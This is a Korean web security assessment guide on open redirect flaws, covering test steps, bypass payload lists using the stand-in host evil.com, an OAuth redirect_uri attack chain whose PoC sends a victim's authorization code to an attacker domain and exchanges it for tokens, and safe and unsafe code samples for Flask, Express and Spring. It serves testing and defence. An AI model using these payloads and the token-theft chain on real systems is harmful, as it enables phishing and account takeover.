---
sidebar_position: 22
title: 오픈 리다이렉트 (Open Redirect)
description: 웹 진단 - Open Redirect 점검 절차, URL 검증 우회 패턴 (스킴/@/부분매칭/인코딩), OAuth redirect_uri 우회, PoC 양식
keywords: [Open Redirect, URL Redirection, Unvalidated Redirect, Phishing, OAuth, redirect_uri, SSO, Token Theft, OWASP A01]
draft: false
---

# 오픈 리다이렉트 (Open Redirect)

> 서버가 사용자 입력 URL 을 그대로 따라가 **외부 도메인으로 리다이렉트** 되는 결함.
> 단독으로는 피싱 신뢰도 향상이지만, **OAuth / SSO 의 `redirect_uri` 검증 미흡과 결합되면 인증 코드 / 액세스 토큰 탈취** 까지 직결.

## 점검 개요

| 항목 | 내용 |
| :--- | :--- |
| **분류** | OWASP A01:2025 - Broken Access Control (URL 검증 카테고리) / KISA URL 접근 제어 |
| **CWE** | [CWE-601: URL Redirection to Untrusted Site](https://cwe.mitre.org/data/definitions/601.html) |
| **영향도** | 🟡 (피싱 단독) / 🔴 (OAuth `redirect_uri` 우회 → 토큰 탈취) |
| **점검 난이도** | 하 (1차 탐지) / 중 (화이트리스트 검증 우회) |
| **예상 점검 시간** | 30분 ~ 2시간 |

---

## 점검 목적

redirect 대상 URL 이 사용자 입력으로부터 결정되는 흐름을 식별하고, **외부 도메인으로 임의 이동이 가능한지** 확인한다. 단독 결함으로는 피싱 페이지의 진짜 도메인 클로킹 (피해자가 진짜 도메인을 클릭) 정도의 임팩트지만, **OAuth/SSO 환경에서 `redirect_uri` 가 부분 매칭으로 검증되면 인증 코드가 공격자 서버로 전달되어 계정 탈취** 까지 가능.

> **다른 페이지와 영역 분리**
> - HTTP Response Splitting / CRLF Injection (`%0d%0aLocation:`) → 본 페이지에서는 한 줄 언급, 별도 영역
> - 클라이언트 측 `location.href = userInput`, `<meta http-equiv="refresh">` 의 JS 변조 → `xss.md` (DOM XSS) 와 일부 겹침
> - SSRF (서버가 직접 `userInput` URL 로 요청 보내는 경우) → `ssrf.md`

---

## 유형 구분

| 유형 | 핵심 |
| :--- | :--- |
| **단순 GET/POST 파라미터 리다이렉트** | `?returnTo=`, `?url=`, `?next=`, `?redirect=`, `?dest=`, `?callback=` |
| **로그인 / 로그아웃 후 redirect** | 가장 흔한 진입점 — `next` 파라미터 |
| **OAuth / SSO `redirect_uri` 검증 미흡** | 임팩트 최상위. 인증 코드 / 토큰 탈취 |
| **HTML meta refresh / JS 리다이렉트** | 일부는 클라이언트 영역, DOM XSS 와 겹침 |

---

## 진단 절차

### Step 1. 진입점 식별

Burp 시퀀스에서 redirect 흐름을 모두 수집. 흔한 파라미터 이름:

```
?returnTo=    ?return=     ?next=        ?redirect=    ?redirect_uri=
?url=         ?dest=       ?destination= ?continue=    ?callback=
?goto=        ?target=     ?rurl=        ?forward=     ?path=
```

응답 형태 우선순위:

- **3xx + `Location` 헤더** — 서버 측 리다이렉트 (가장 흔함, 본 페이지 주 대상)
- **`<meta http-equiv="refresh" content="0; url=...">`** — HTML 본문 리다이렉트
- **`<script>location.href = "..."</script>`** — JS 리다이렉트 (DOM 영역 결합 가능)

특히 우선 점검 흐름:

- 로그인 / 로그아웃 / 회원가입 / 비밀번호 재설정 후 `next` 또는 `returnTo` 리다이렉트
- OAuth / SSO 콜백 흐름 (`/oauth/authorize?...&redirect_uri=...`)
- 결제 PG 콜백, 외부 인증 (네이버/카카오/구글) 흐름

### Step 2. 기본 탐지

가장 단순한 외부 도메인 페이로드:

```http
GET /login?returnTo=https://evil.com HTTP/1.1
Host: <TARGET>
```

응답 헤더의 `Location` 또는 본문의 `meta refresh` 가 `evil.com` 으로 향하면 1차 확정.

### Step 3. 검증 우회 시도

기본 페이로드가 차단되면 케이스 2~5 의 우회 패턴을 순차 적용.

### Step 4. 영향 입증

- **피싱 시나리오**: 공격자가 호스팅한 가짜 로그인 페이지로 자동 이동
- **OAuth 토큰 탈취 시나리오**: `redirect_uri` 우회로 인증 코드가 공격자 서버로 전달되어 액세스 토큰 발급까지 입증

---

## 페이로드 / 테스트 케이스

### 케이스 1: 기본 외부 도메인

**언제 쓰는지**: Step 2 의 첫 페이로드. 검증이 아예 없는 경우 즉시 확정.

```
?returnTo=https://evil.com
?returnTo=http://evil.com
?returnTo=//evil.com
```

**판정**: 응답 `Location:` 헤더가 `https://evil.com` (또는 `//evil.com`) 으로 그대로 나가면 취약. 단, 응답이 `Location: /error` 같은 정적 페이지면 검증이 동작한 것 — 케이스 2~5 로 우회 시도.

### 케이스 2: 스킴 / 슬래시 우회

**언제 쓰는지**: 기본 페이로드가 차단됐고, 검증 로직이 `http://` / `https://` 같은 스킴 prefix 만 확인할 가능성이 있을 때.

```
//evil.com               ← protocol-relative URL. 스킴 검증 우회의 가장 흔한 케이스
/\evil.com               ← 슬래시-백슬래시 혼합 (브라우저는 // 로 해석)
\\evil.com               ← Windows 경로처럼 보이지만 브라우저는 // 처리
\/\/evil.com             ← 인코딩 변형
https:evil.com           ← 슬래시 누락 (일부 파서는 호스트로 해석)
https://%00evil.com      ← null byte 삽입
javascript:alert(document.domain)   ← 모던 브라우저는 Location 헤더에서 차단되지만 meta refresh / a href 에서는 가능
data:text/html,<script>alert(1)</script>
```

**판정**: 응답 `Location:` 에 위 페이로드가 그대로 들어가고, 브라우저에서 실제로 `evil.com` 으로 이동하면 취약. `javascript:` / `data:` 는 모던 Chrome/Firefox 가 `Location` 헤더에서 차단하므로 → meta refresh / JS 리다이렉트 흐름에서만 의미 있음.

### 케이스 3: `@` 트릭 (User Info 우회)

**언제 쓰는지**: 검증 로직이 `startsWith("https://target.com")` 같은 prefix 매칭일 때. URL 의 `userinfo@host` 문법을 이용.

```
https://target.com@evil.com
https://target.com.@evil.com
https://target.com%2F@evil.com           ← / 인코딩
https://target.com%252F@evil.com         ← 이중 인코딩
//target.com@evil.com
```

**판정**: 브라우저는 `evil.com` 으로 이동 (userinfo 부분 무시), 서버 검증은 `target.com` 으로 시작한다고 보고 통과. 응답 `Location:` 이 위 페이로드 그대로 나가고 브라우저에서 `evil.com` 으로 이동하면 취약.

### 케이스 4: 화이트리스트 부분 매칭 우회

**언제 쓰는지**: 검증 로직이 `startsWith` / `contains` / `endsWith` 같은 문자열 비교에 의존할 때. 호스트 정확 추출 후 비교가 아니면 거의 다 우회 가능.

**4-1. `startsWith` 우회 (서브도메인 트릭):**

```
https://target.com.evil.com               ← 서브도메인처럼 보이지만 호스트는 evil.com
https://target.com.evil.com/callback
```

**4-2. `contains` 우회 (경로/쿼리/프래그먼트 포함):**

```
https://evil.com/target.com
https://evil.com/?target.com
https://evil.com#target.com
https://evil.com?next=target.com
```

**4-3. `endsWith` 우회 (suffix 매칭):**

```
https://eviltarget.com                    ← 끝이 'target.com' 처럼 보임
https://attacker-target.com
```

**4-4. 디렉토리 traversal 결합:**

```
https://target.com/redirect?url=/..%2f..%2f@evil.com
https://target.com/../../@evil.com
```

**판정**: 위 변형 중 하나로 응답 `Location:` 이 통과되고 브라우저가 `evil.com` 으로 이동하면 취약. **`startsWith` / `contains` 검증 패턴은 거의 100% 우회 가능** 이므로, 발견 즉시 검증 로직 자체를 결함으로 보고.

### 케이스 5: 인코딩 / 유니코드 우회

**언제 쓰는지**: 단순 문자열 필터링 (`if 'evil.com' in url`) 만 적용된 경우. URL 디코딩 시점과 검증 시점의 불일치 (parser differential) 노림.

**5-1. URL 인코딩:**

```
%2F%2Fevil.com                  ← // 인코딩
%2f%2fevil.com
%252F%252Fevil.com              ← 이중 인코딩
%5c%5cevil.com                  ← \\ 인코딩
```

**5-2. 백슬래시 / 공백:**

```
https:\\evil.com
https:/\evil.com
https://%09evil.com             ← 탭 문자
https://%20evil.com
```

**5-3. IDN / Punycode 동음이의:**

```
https://xn--tre-9la.com         ← Punycode (다른 도메인)
https://tаrget.com              ← 키릴 'а' (U+0430), 보기에는 target.com 과 동일
https://target.com.evil.com (실제로 등록된 IDN 도메인 사용)
```

**판정**: 위 변형 중 하나가 통과되면 디코딩 / 정규화 처리가 누락된 것. IDN 동음이의는 도메인을 실제 등록해야 입증 가능하지만, 페이로드가 통과되는 것만으로도 결함 보고 가능.

### 케이스 6: OAuth `redirect_uri` 검증 우회 (가장 임팩트 큼)

**언제 쓰는지**: OAuth 2.0 Authorization Code Flow 에서 클라이언트(서비스) 가 `redirect_uri` 를 IdP 로 전달하는 단계. 사전 등록 URI 와의 매칭 검증이 부분 매칭이면 인증 코드 탈취 가능.

**전제 — 정상 흐름:**

```
1. 사용자가 로그인 버튼 클릭
   GET /oauth/authorize?
       client_id=app123&
       redirect_uri=https://app.target.com/callback&
       response_type=code&
       state=xyz
       → IdP 가 사용자 인증 후 위 redirect_uri 로 code 전달

2. https://app.target.com/callback?code=AUTH_CODE&state=xyz

3. 백엔드가 code 를 access_token 으로 교환
```

**공격 페이로드 — `redirect_uri` 변조:**

```
?redirect_uri=https://app.target.com.evil.com/callback
?redirect_uri=https://app.target.com@evil.com/callback
?redirect_uri=https://evil.com/?x=https://app.target.com/callback
?redirect_uri=https://app.target.com/callback/../../@evil.com
?redirect_uri=https://app.target.com.evil.com/callback#@app.target.com
```

**공격 시나리오:**

```
1. 공격자가 위 변조된 redirect_uri 가 포함된 OAuth 시작 링크 작성:
   https://idp.example.com/oauth/authorize?
     client_id=app123&
     redirect_uri=https://app.target.com.evil.com/callback&
     response_type=code&
     state=xyz

2. 피해자가 해당 링크 클릭 → IdP 에서 정상 로그인
   (IdP 가 redirect_uri 부분 매칭만 검증하면 통과)

3. IdP 가 인증 코드를 공격자 도메인으로 전달:
   https://app.target.com.evil.com/callback?code=AUTH_CODE&state=xyz

4. 공격자가 code 를 받아 즉시 토큰 엔드포인트로 교환
   → 피해자 계정 액세스 토큰 획득 → 계정 완전 탈취
```

**판정**: IdP 가 변조된 `redirect_uri` 를 통과시키면 (= 사용자가 인증 후 공격자 도메인으로 code 가 전달되면) 즉시 Critical. 사전 등록 URI 와 완전 일치 검증이 아닌 모든 케이스가 결함.

> RFC 6749 §3.1.2.3 은 `redirect_uri` 의 **완전 일치** 매칭을 권고. 와일드카드 / prefix / suffix 매칭은 OAuth 보안 모범사례 위반.

### 그 외 — 한 줄 언급만 (실무 비중 낮음 / 별도 영역)

- **CRLF Injection 결합** — `%0d%0aLocation: https://evil.com` 으로 Location 헤더 직접 주입. 모던 웹 서버는 거의 차단. `security-headers.md` 영역
- **POST 폼 자동 제출 + open redirect** — CSRF + open redirect 체인. 단독 결함은 아님
- **HTML meta refresh / `location.href = userInput`** — DOM 측면, `xss.md` 와 겹침
- **SSRF 와의 결합** — 서버가 redirect 를 따라가서 내부 요청 발생 시 `ssrf.md` 영역

---

## 취약 판정 기준

다음 중 **하나라도** 해당하면 취약:

- [ ] redirect 파라미터에 **임의 외부 도메인** 그대로 통과 (`Location:` 헤더가 외부로 향함)
- [ ] 스킴 / `@` / 슬래시 / 인코딩 트릭으로 화이트리스트 우회
- [ ] `startsWith` / `contains` / `endsWith` 같은 **부분 매칭 검증** 으로 우회 가능 (검증 로직 자체가 결함)
- [ ] **OAuth `redirect_uri`** 가 사전 등록 URI 와 완전 일치가 아닌 부분 매칭으로 검증
- [ ] meta refresh / JS 리다이렉트가 사용자 입력 URL 로 동작

**오탐 주의:**

- [ ] 응답이 외부 도메인으로 향해도 의도된 동작 (외부 결제 PG, SSO IdP, 위탁사 연계) 일 수 있음 — **점검 전 정책 확인 필요**
- [ ] `Location:` 헤더가 외부 URL 이어도 실제로 브라우저가 그 URL 로 이동하는지 확인 (서버가 안내 페이지로 돌리는 경우도 있음)
- [ ] OAuth `redirect_uri` 변조 시 IdP 가 거부하면 (`invalid_redirect_uri`) 정상 동작 — 취약 아님
- [ ] `javascript:` / `data:` 페이로드는 모던 브라우저가 `Location` 헤더에서 차단 — 1차 평가 시점에서 실제 브라우저 동작도 확인

---

## PoC 양식 (보고서 붙여넣기용)

### PoC 1 — [Open Redirect] 로그인 후 returnTo 파라미터 검증 미흡으로 인한 임의 외부 리다이렉트

1. `<TARGET>` 의 로그인 페이지 (`/login?returnTo=<URL>`) 에서 `returnTo` 파라미터 식별
2. `returnTo=//evil.com` 변조 페이로드 입력
3. 정상 로그인 후 응답 `Location:` 헤더가 `//evil.com` 으로 향함
4. 브라우저가 `https://evil.com` 으로 이동 — 피싱 페이지 호스팅 시 사용자가 의심 없이 클릭

**요청:**

```http
POST /login HTTP/1.1
Host: <TARGET>
Content-Type: application/x-www-form-urlencoded

username=victim&password=Pass123!&returnTo=//evil.com
```

**응답 — 취약 발현 증거:**

```http
HTTP/1.1 302 Found
Location: //evil.com
Set-Cookie: SESSION=...; HttpOnly; Secure
```

**확인 사항:**
- `returnTo` 파라미터가 외부 도메인 (`//evil.com`) 으로 변조되어도 검증 없이 그대로 `Location:` 헤더에 사용됨
- 브라우저가 `https://evil.com` 으로 자동 이동
- 공격자가 `https://evil.com/login.html` 에 동일한 디자인의 가짜 로그인 페이지를 호스팅하면, 사용자는 진짜 `<TARGET>` 로그인 링크를 클릭해 가짜 페이지에 도착 → 자격증명 입력 후 탈취 (URL 클릭 시점에 진짜 도메인이 보이므로 피싱 신뢰도 매우 높음)

---

### PoC 2 — [Open Redirect + OAuth] redirect_uri 부분 매칭 우회를 통한 인증 코드 탈취

1. `<TARGET>` 의 OAuth 클라이언트(서비스 A) 의 정상 등록 `redirect_uri` 가 `https://app.target.com/callback`
2. 공격자가 `redirect_uri=https://app.target.com.evil.com/callback` 으로 변조된 OAuth 시작 링크 제작
3. 피해자가 해당 링크 클릭 → IdP 에서 정상 로그인
4. IdP 의 `redirect_uri` 검증이 `startsWith("https://app.target.com")` 패턴으로 동작 → 통과
5. 인증 코드 (`code`) 가 공격자 도메인 (`evil.com`) 으로 전달됨
6. 공격자가 code 를 즉시 토큰 엔드포인트로 교환 → 피해자 계정 액세스 토큰 획득

**공격자 작성 링크 (피해자에게 전달):**

```
https://idp.<TARGET>/oauth/authorize?
  client_id=app123&
  redirect_uri=https://app.target.com.evil.com/callback&
  response_type=code&
  scope=openid+profile+email&
  state=xyz
```

**피해자 인증 후 IdP → 공격자 서버로 전달되는 요청:**

```http
GET /callback?code=AUTH_CODE_LEAKED&state=xyz HTTP/1.1
Host: app.target.com.evil.com
```

**공격자가 code → access_token 교환:**

```http
POST /oauth/token HTTP/1.1
Host: idp.<TARGET>
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code&
code=AUTH_CODE_LEAKED&
redirect_uri=https://app.target.com.evil.com/callback&
client_id=app123&
client_secret=...
```

**응답 — 취약 발현 증거:**

```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "access_token": "eyJhbGc...",
  "refresh_token": "...",
  "id_token": "eyJhbGc...",
  "token_type": "Bearer",
  "expires_in": 3600
}
```

**확인 사항:**
- 정상 등록 URI 는 `https://app.target.com/callback` 이지만, IdP 가 `startsWith` 패턴으로 검증하여 `https://app.target.com.evil.com/callback` 도 통과
- 피해자 인증 후 인증 코드가 공격자 도메인 (`evil.com`) 으로 전달됨
- 공격자가 code 를 토큰 엔드포인트로 교환하여 액세스 토큰 / 리프레시 토큰 / ID 토큰 모두 획득 → 피해자 계정 완전 탈취
- 단일 결함만으로 계정 탈취 + OIDC `id_token` 까지 발급되므로 Critical
- RFC 6749 §3.1.2.3 위반 — `redirect_uri` 는 사전 등록 URI 와 **완전 일치** 매칭이어야 함

---

## 영향도 분석

- **기밀성 (Confidentiality)**: 🟡 (피싱 단독) / 🔴 (OAuth 토큰 탈취) — 자격증명 / 인증 토큰 노출
- **무결성 (Integrity)**: 🟡 — 직접 변조는 없지만, 탈취된 계정으로 후속 변경 가능
- **가용성 (Availability)**: 🟢 — 직접 영향 거의 없음
- **추가 위협**:
  - **피싱 신뢰도 향상** — 진짜 `<TARGET>` 도메인 링크를 클릭하므로 사용자가 의심 안 함, 메일/SMS 캠페인 효과 극대화
  - **OAuth / SSO 토큰 탈취** — 단일 결함으로 계정 완전 탈취, 다른 SSO 연계 서비스까지 횡적 침해
  - **OAuth state 파라미터 검증 우회와 결합** — CSRF 보호 우회까지 가능

**비즈니스 임팩트:**
Open Redirect 단독은 흔히 "Low" 로 잘못 평가되지만, **피싱 캠페인의 신뢰도 향상** 만으로도 자격증명 탈취 사고로 직결되며, **OAuth `redirect_uri` 우회** 와 결합되면 단일 결함만으로 계정 완전 탈취 (Critical). 특히 SSO 통합이 광범위한 환경에서는 한 곳의 결함이 다수 서비스로 파급되므로 우선순위 상향 필요.

---

## 대응방안

### 개발자 관점 (필수)

1. **상대 경로만 허용 (가장 안전)** — `returnTo` / `next` 같은 파라미터는 절대 URL 거부, 상대 경로 (`/dashboard`) 만 받기:

   ```python
   # 입력이 / 로 시작하고 // 또는 \\ 로 시작하지 않을 때만 허용
   if not next_url.startswith('/') or next_url.startswith('//') or next_url.startswith('/\\'):
       next_url = '/'
   ```

2. **외부 URL 을 받아야 한다면 정확 매칭 화이트리스트** — 호스트를 표준 URL 파서로 추출 후 `==` 비교:

   ```python
   from urllib.parse import urlparse
   ALLOWED_HOSTS = {'app.target.com', 'partner.example.com'}

   parsed = urlparse(redirect_url)
   if parsed.hostname not in ALLOWED_HOSTS:
       redirect_url = '/'
   ```

   절대 `startsWith` / `contains` / `endsWith` 금지.

3. **외부 redirect 시 중간 안내 페이지** — 사용자에게 "외부 사이트로 이동합니다" 안내 후 명시적 클릭으로 진행. 피싱 신뢰도 크게 감소.

4. **OAuth `redirect_uri` 는 사전 등록 URI 와 완전 일치** (RFC 6749 §3.1.2.3 권고):
   - 클라이언트 등록 시 정확한 URI 등록 (와일드카드 금지)
   - IdP 측 검증은 문자열 정확 매칭
   - 필요 시 클라이언트 단위로 여러 URI 등록 (각각 정확 매칭)
   - **PKCE (RFC 7636) 적용** — `redirect_uri` 우회 시에도 code 만으로 토큰 교환 불가
   - **state 파라미터 검증** — CSRF 보호 동시 적용

5. **URL 파싱은 표준 라이브러리** — Python `urllib.parse`, Node.js `URL` (WHATWG), Java `java.net.URI`. 직접 문자열 처리 (`split('/')`, `startsWith`) 금지.

6. **인코딩 정규화 후 검증** — 디코딩 → 정규화 → 검증 순서. 디코딩 전 검증 시 인코딩 우회 (`%2F%2F` ) 가능.

### 운영자 관점

1. **WAF 룰 — 보조 수단** — redirect 파라미터에 외부 도메인 / `@` / `//` 등의 패턴 차단. 우회 변형이 많아 단독 의존 금지.

2. **이상 redirect 비율 모니터링** — 단일 IP/세션에서 외부 redirect 응답 비율이 급증하면 알람.

3. **OAuth 인증 로그 — `redirect_uri` 파라미터 기록** — 변조 시도 감지 + 사고 시 추적.

### 안전 / 위험 코드 비교 (스택별)

**Python (Flask):**

```python
from urllib.parse import urlparse
from flask import request, redirect, url_for

# 위험 1 — 사용자 입력 그대로 redirect
@app.route('/login')
def login():
    # ... 로그인 처리 ...
    next_url = request.args.get('next', '/')
    return redirect(next_url)                         # Open Redirect

# 위험 2 — startsWith 검증 (우회 가능)
def is_safe_url(url):
    return url.startswith('https://app.target.com')   # //evil.com, target.com.evil.com 우회

# 안전 1 — 상대 경로만 허용
def is_safe_redirect(url):
    if not url:
        return False
    # // 로 시작하면 protocol-relative 라 거부
    if url.startswith('//') or url.startswith('/\\'):
        return False
    # 절대 URL 거부 (스킴 포함)
    parsed = urlparse(url)
    if parsed.scheme or parsed.netloc:
        return False
    return url.startswith('/')

@app.route('/login')
def login():
    next_url = request.args.get('next', '/')
    if not is_safe_redirect(next_url):
        next_url = '/'
    return redirect(next_url)

# 안전 2 — 호스트 화이트리스트 (외부 redirect 필요 시)
ALLOWED_HOSTS = {'app.target.com', 'partner.example.com'}

def is_allowed_external(url):
    parsed = urlparse(url)
    return parsed.scheme in ('http', 'https') and parsed.hostname in ALLOWED_HOSTS
```

**Node.js (Express):**

```javascript
// 위험 — 사용자 입력 그대로 redirect
app.get('/login', (req, res) => {
    // ... 로그인 처리 ...
    res.redirect(req.query.next || '/');               // Open Redirect
});

// 안전 1 — 상대 경로만 허용
function isSafeRedirect(url) {
    if (!url) return false;
    if (url.startsWith('//') || url.startsWith('/\\')) return false;
    try {
        // 절대 URL 로 파싱되면 거부
        new URL(url);
        return false;
    } catch (e) {
        // 상대 경로는 new URL 파싱 실패 (또는 base 필요)
        return url.startsWith('/');
    }
}

app.get('/login', (req, res) => {
    let next = req.query.next || '/';
    if (!isSafeRedirect(next)) next = '/';
    res.redirect(next);
});

// 안전 2 — 호스트 화이트리스트
const ALLOWED_HOSTS = new Set(['app.target.com', 'partner.example.com']);

function isAllowedExternal(url) {
    try {
        const u = new URL(url);
        return (u.protocol === 'https:' || u.protocol === 'http:')
            && ALLOWED_HOSTS.has(u.hostname);
    } catch {
        return false;
    }
}
```

**Java (Spring):**

```java
import java.net.URI;
import java.util.Set;

// 위험 — 사용자 입력 그대로 redirect
@GetMapping("/login")
public String login(@RequestParam(defaultValue = "/") String next) {
    // ... 로그인 처리 ...
    return "redirect:" + next;                          // Open Redirect
}

// 안전 — 상대 경로만 허용 + 호스트 화이트리스트
private static final Set<String> ALLOWED_HOSTS =
    Set.of("app.target.com", "partner.example.com");

private boolean isSafeRedirect(String url) {
    if (url == null || url.isEmpty()) return false;
    if (url.startsWith("//") || url.startsWith("/\\")) return false;
    try {
        URI uri = new URI(url);
        if (uri.getScheme() == null && uri.getHost() == null) {
            // 상대 경로
            return url.startsWith("/");
        }
        // 절대 URL 인 경우 화이트리스트 검증
        return ALLOWED_HOSTS.contains(uri.getHost())
            && ("http".equals(uri.getScheme()) || "https".equals(uri.getScheme()));
    } catch (Exception e) {
        return false;
    }
}

@GetMapping("/login")
public String login(@RequestParam(defaultValue = "/") String next) {
    if (!isSafeRedirect(next)) next = "/";
    return "redirect:" + next;
}
```

**OAuth `redirect_uri` 검증 (Spring Authorization Server 예시):**

```java
// 위험 — startsWith 또는 contains 검증
if (!registeredUri.startsWith(requestedUri)) { ... }    // 우회 가능

// 안전 — 완전 일치 매칭 (RegisteredClient 등록 시 정확 URI 사용)
if (!registeredClient.getRedirectUris().contains(requestedUri)) {
    throw new OAuth2AuthenticationException("invalid_redirect_uri");
}
// + PKCE 강제, state 검증
```

---

## 참고자료

- [OWASP Cheat Sheet - Unvalidated Redirects and Forwards](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html)
- [PortSwigger - Open redirection](https://portswigger.net/kb/issues/00500100_open-redirection-reflected)
- [PortSwigger - OAuth 2.0 authentication vulnerabilities](https://portswigger.net/web-security/oauth)
- [PayloadsAllTheThings - Open Redirect](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect)
- [HackTricks - Open Redirect](https://book.hacktricks.xyz/pentesting-web/open-redirect)
- [RFC 6749 §3.1.2 - Redirection Endpoint](https://datatracker.ietf.org/doc/html/rfc6749#section-3.1.2)
- [RFC 8252 - OAuth 2.0 for Native Apps](https://datatracker.ietf.org/doc/html/rfc8252)
- [OAuth 2.0 Security Best Current Practice (RFC 9700)](https://datatracker.ietf.org/doc/html/rfc9700)
